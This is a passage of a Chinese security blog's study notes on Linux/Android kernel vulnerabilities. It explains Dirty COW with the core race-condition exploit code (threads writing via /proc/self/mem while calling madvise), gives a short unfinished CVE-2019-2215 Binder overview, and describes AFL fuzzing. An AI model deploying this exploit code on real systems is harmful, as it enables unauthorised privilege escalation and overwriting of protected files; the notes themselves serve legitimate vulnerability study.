+<li>如果选择的页框“脏”了，安排该页写回磁盘，并发生一次上下文切换，挂起产生缺<br>页中断的进程，让其他进程运行直至磁盘传输结束。无论如何，该页框被标记为忙，<br>以免因为其他原因而被其他进程占用。</li>
+<li>一旦页框“干净”后（无论是立刻还是在写回磁盘后），操作系统查找所需页面在磁<br>盘上的地址，通过磁盘操作将其装入。该页面被装入后，产生缺页中断的进程仍然被<br>挂起，并且如果有其他可运行的用户进程，则选择另一个用户进程运行。</li>
+<li>当磁盘中断发生时，表明该页已经被装入，页表已经更新可以反映它的位置，页框也<br>被标记为正常状态。</li>
+<li>恢复发生缺页中断指令以前的状态，程序计数器重新指向这条指令。</li>
+<li>调度引发缺页中断的进程，操作系统返回调用它的汇编语言例程。</li>
+<li>该例程恢复寄存器和其他状态信息，返回到用户空间继续执行，就好像缺页中断没有<br>发生过一样。</li>
+</ul>
+<h4 id="linux内存虚拟文件系统（Proc）"><a href="#linux内存虚拟文件系统（Proc）" class="headerlink" title="linux内存虚拟文件系统（Proc）"></a>linux内存虚拟文件系统（Proc）</h4><ul>
+<li><code>/proc/pid/cmdline</code> 包含了用于开始进程的命令；</li>
+<li><code>/proc/pid/cwd</code>包含了当前进程工作目录的一个链接；</li>
+<li><code>/proc/pid/environ</code> 包含了可用进程环境变量的列表；</li>
+<li><code>/proc/pid/exe</code> 包含了正在进程中运行的程序链接；</li>
+<li><code>/proc/pid/fd/</code> 这个目录包含了进程打开的每一个文件的链接；</li>
+<li><code>/proc/pid/stat</code>包含了进程的状态信息；</li>
+<li><code>/proc/pid/statm</code> 包含了进程的内存使用信息</li>
+<li><strong><code>/proc/self/maps</code> 进程虚拟内存中加载的文件和库等</strong></li>
+<li><strong><code>/proc/self/mem</code>这个文件是一个指向当前进程的虚拟内存文件的文件，当前进程可<br>以通过对这个文件进行读写以直接读写虚拟内存空间</strong></li>
+</ul>
+<h5 id="竞争条件漏洞"><a href="#竞争条件漏洞" class="headerlink" title="竞争条件漏洞"></a>竞争条件漏洞</h5><p>竞争条件是系统中的一种反常现象，由于现代Linux系统中大量使用并发编程，对资源进行共享，如果产生错误的访问模式，便可能产生内存泄露，系统崩溃，数据破坏，甚至安全问题。竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。</p>
+<h5 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">mmap</span>(<span class="hljs-type">void</span>* start, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>将磁盘上的文件映射到虚拟内存中，对于这个函数唯一要说的就是当<code>flags</code>的<code>MAP_PRIVATE</code>被置为<code>1</code>时，对<code>mmap</code>得到内存映射进行的写操作会使内核触发<code>COW</code>操作，写的是<code>COW</code>后的内存，不会同步到磁盘的文件中。</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">madvice</span>(<span class="hljs-type">caddr_t</span> addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> advice)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>告诉内核内存<code>addr～addr+len</code>在接下来的使用状况，以便内核进行一些进一步的内存管理操作。当<code>advice</code>为<code>MADV_DONTNEED</code>时，此系统调用相当于通知内核<code>addr～addr+len</code>的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> count)</span></span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>向<code>fd</code>描述符所指向的文件写入最多<code>count</code>长度的<code>buf</code>中的内容。</li>
+</ul>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以看到主要原因：</p>
+<p>在write的过程中，包含两个<code>non-atomic</code>操作：<code>1、locate the physical address</code>，<code>2、and write to that address</code>导致竞争条件的发生。下面来梳理一下利用流程：</p>
+<p>1、打开一个只读文件，将它映射内存。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;readonly_file&quot;</span>, O_RDONLY);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">file_info</span>;</span><br>fstat(f, &amp;file_info);<br><span class="hljs-built_in">map</span> = mmap(<span class="hljs-literal">NULL</span>, file_info.st_size, PROT_READ, MAP_PRIVATE, f, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+<p>2、尝试去写这个文件，这是触发<code>copy on wirte</code>机制，但是由于<code>write</code>那两个非原子操作，所以其他进程可以驳入执行代码。试想：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>尝试向文件写内容，此时状态如下图：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>由于触发了<code>copy on write</code>机制，状态发生变化：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>此时攻击者利用条件竞争驳入代码，将<code>private_mapping of root_file</code>除去，状态发生变化：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>再次回到<code>write</code>进程时，<code>kernel</code>已经指向原<code>root_file</code>，目的达成：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>所以需要两个进程，一个尝试去写，一个尝试去释放：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs CQL">void *write_to_mapping (void *arg) &#123;<br>    // Write to mapping through &#x27;/proc/self/mem&#x27;.<br>    int i;<br>    for (i = 0; i &lt; 10000; i++) &#123;<br>        int f = open(&quot;/proc/self/mem&quot;, O_RDWR);<br>        lseek(f, (uintptr_t)map, SEEK_SET);<br>        write(f, to_be_written, strlen(to_be_written));<br>    &#125;<br>&#125;<br><br><br>void* drop_mapping (void *arg) &#123;<br>    // (m)advise kernel to drop mapping.<br>    int i;<br>    for (i = 0; i &lt; 10000; i++)<br>        madvise(map, 100, MADV_DONTNEED);<br>&#125;<br><br>pthread_t thread_1, thread_2;<br>pthread_create(&amp;thread_1, NULL, write_to_mapping, NULL);<br>pthread_create(&amp;thread_2, NULL, drop_mapping, NULL);<br>pthread_join(thread_1, NULL);<br>pthread_join(thread_2, NULL);<br></code></pre></td></tr></table></figure>
+
+<h4 id="UAF：CVE-2019-2215"><a href="#UAF：CVE-2019-2215" class="headerlink" title="UAF：CVE-2019-2215"></a>UAF：CVE-2019-2215</h4><p>1、找到漏洞描述。</p>
+<p>2、找到对应的内核代码。</p>
+<p>3、找到对应的POC和EXP。</p>
+<p>4、研究漏洞利用方式。</p>
+<p><code>CVE-2019-2215</code>由<code>Google公司Project Zero</code>小组发现，并被该公司的威胁分析小组（TAG）确认其已用于实际攻击中。TAG表示该漏洞利用可能跟一家出售漏洞和利用工具的以色列公司NSO有关，随后NSO集团发言人公开否认与该漏洞存在任何关系。该漏洞实质是内核代码一处UAF漏洞，成功利用可以造成本地权限提升，并有可能完全控制用户设备。但要成功利用该漏洞，需要满足某些特定条件。</p>
+<h5 id="ANDROID-BINDER简介："><a href="#ANDROID-BINDER简介：" class="headerlink" title="ANDROID BINDER简介："></a><code>ANDROID BINDER</code>简介：</h5><p><code>IPC</code>是<code>Inter-process communication</code>的缩写，即进程间通信。<code>IPC</code>是一种允许进程间互相通信交换数据的机制。在<code>Linux</code>平台上，进程之间是隔离的，各个进程运行在自己的虚拟地址空间中，如果不采取IPC手段,进程之间是不能互相交换数据的。为了实现进程之间的数据交换，<code>Linux</code>提供了多种<code>IPC</code>机制：</p>
+<ul>
+<li>信号、管道、Socket、消息队列、信号量、共享内存</li>
+</ul>
+<p><code>Android</code>是基于<code>Linux</code>系统开发，除了上面的<code>IPC</code>机制以外，<code>Android</code>又提供了一种新的选择：<code>binder</code>。站在系统角度来看，<code>binder</code>的实现包括：</p>
+<ul>
+<li>一个<code>Client</code>进程、一个<code>Service</code>进程、<code>Binder</code>驱动。</li>
+</ul>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/binder_1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>而<code>Binder Driver</code>位于内核态，所有进程都可以访问，下图为<code>Binder</code>架构：</p>
+<p><img src="http://handsomedog.top/wp-content/uploads//2020/01/binder_2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><code>vectored I/O</code>基础：In computing, vectored I&#x2F;O, also known as scatter&#x2F;gather I&#x2F;O, is a method of input and output by which a single procedure call sequentially reads data from multiple buffers and writes it to a single data stream, or reads data from a data stream and writes it to multiple buffers, as defined in a vector of buffers.</p>
+<h5 id="漏洞-–-BINDER-LOCTL"><a href="#漏洞-–-BINDER-LOCTL" class="headerlink" title="漏洞 – BINDER_LOCTL"></a>漏洞 – BINDER_LOCTL</h5><p>在binder_free_thread函数中，可以触发UAF。</p>
+<p>TO-DO、挖坑。</p>
+<h3 id="常用Fuzz技术"><a href="#常用Fuzz技术" class="headerlink" title="常用Fuzz技术"></a>常用Fuzz技术</h3><h4 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h4><p>暴力fuzzer，安全研究者和爱好者利用它已经有了非常多的产出。</p>
+<p>特点：instrumentation-guided、genetic-algorithm、edge coverage to guide fuzzing。</p>
+<p>AFL执行流程：</p>
+<ul>
+<li>load user-supplied initial test cases into the queue.</li>
+<li>Take next input file from the queue.</li>
+<li>Attempt to trim the test case to the smallest size that doesn’t alter the measure behavior of the program.</li>
+<li>Repeatedly mutate the file using a balanced and well-researched variety of traditional fuzzing strategies.</li>
+<li>If any of the generated mutations resulted in a new state transition recoreded by the instrumentation, add mutated output as a new entry in the queue.</li>
+<li>go to 2.</li>
+</ul>
+<p>Fuzzing技术是当前最为强大而有效的漏洞挖掘技术，大多的远程代码执行以及权限提升等较为严重的漏洞都是通过Fuzzing而产出的。AFL(American Fuzzy Lop)被称为目前最高级的Fuzzing测试工具之一，可以有效地对二进制程序进行fuzz，开启相应功能可更深入的根据需求挖掘相关漏洞，如栈溢出、堆溢出、UAF等。</p>
+<p>AFL有两种fuzz途径：</p>
+<ul>
+<li>开源软件：AFL软件进行编译的同时进行插桩，以方便fuzz</li>
+</ul>
+<ol>
+<li>闭源软件：配合QEMU直接对闭源的二进制代码进行fuzz</li>
+</ol>
+<p>插桩：在AFL编译文件时候afl-gcc会在规定位置插入桩代码，可以理解为一个个的小断点(但是没有暂停功能)，在后续fuzz的过程中会根据这些桩代码进行路径探索，测试等。使得测试覆盖面更广，更全面。另外，在每个分支插入桩代码的同时，<code>afl-as</code>会生成一个随机数作为标识这个代码块的<code>key</code>，运行时便可以利用这些生成的随机数来识别相应代码块。</p>
+<p>AFL主要是由三部分组成：</p>
+<ul>
+<li>第一部分：编译器<code>wrapper</code>：他的功能在于对目标软件（开源）进行编译，编译过程中插入一些AFL识别的函数用以识别探索路径，众所周知的<code>linux</code>下的<code>C/C++</code>编译工具<code>gcc/g++</code>，<code>afl</code>的编译工具为<code>afl-gcc/afl-g++,afl-clang</code>等。</li>
+<li>第二部分：测试器<code>fuzzer：afl-fuzz</code>，就是AFL重要的主体，用以对软件进行fuzzing。</li>
+<li>第三部分：如<code>afl-cmin,afl-tmin</code>，都是为提升测试的效率和成功率而服务的。</li>
+</ul>
+<p>安装：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz<br><span class="hljs-attribute">tar</span> -zxvf afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b.tgz<br><span class="hljs-attribute">cd</span> afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b<br><span class="hljs-attribute">make</span><br><span class="hljs-attribute">sudo</span>  make install<br></code></pre></td></tr></table></figure>
+
+<p><code>ASAN(Address Sanitizer)</code>是<code>linux</code>下的内存检测工具，早先是<code>LLVM</code>中的特性，后来被加入<code>GCC 4.9</code>，现被<code>clang</code>和<code>gcc</code>支持，用于运行的时候对内存进行检测，以达到发现内存漏洞的效果。</p>
+<p>在开启<code>ASAN</code>后。<code>afl</code>插桩则会在目标代码的关键位置添加检查代码，例如：<code>malloc(),free()</code>等，一旦发现了内存访问错误，便可以<code>SIGABRT</code>中止程序。</p>
+<p>需要注意的是：</p>
+<ul>
+<li>1、例如越界读等内存访问错误不一定会造成程序的崩溃，所以在没有开启ASAN的情况下，许多内存漏洞都无法被AFL给发现。所以在编译二进制代码的时候，强烈建议开启ASAN。</li>
+<li>2、ASAN开启后的fuzzing会消耗更多的内存，这是需要注意的因素，对于32位的程序，基本上800MB即可；但64为程序大概需要20TB,所以，使用ASAN的话，建议添加CFLAGS&#x3D;-m32来限制编译目标为32位，否则，可能应为64位消耗内存过多而造成程序崩溃。</li>
+<li>3、 在使用了ASAN之后，可以再alf-fuzz的时候通过选项-m来指定使用的内存上限。启用了ASAN的32位程序，一般设置-m 1024即可。</li>
+</ul>
+<h4 id="Syzkaller"><a href="#Syzkaller" class="headerlink" title="Syzkaller"></a>Syzkaller</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/syzkaller.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>To be continue…</p>
+<p>因为自己整理的一片一片很乱，引用了<a target="_blank" rel="noopener" href="http://handsomedog.top/?p=461&from=timeline&isappinstalled=0">帅帅狗师傅的笔记</a>作为记载方便学习，已征得本人同意。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" class="category-chain-item">移动安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Android/" class="print-no-link">#Android</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Android移动安全</div>
+      <div>http://example.com/2020/01/23/android_sec/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2020年1月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/02/08/wust_funnyctf_WriteUp/" title="Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/11/17/upload-labs/" title="基于upload-labs的文件上传汇总">
+                        <span class="hidden-mobile">基于upload-labs的文件上传汇总</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
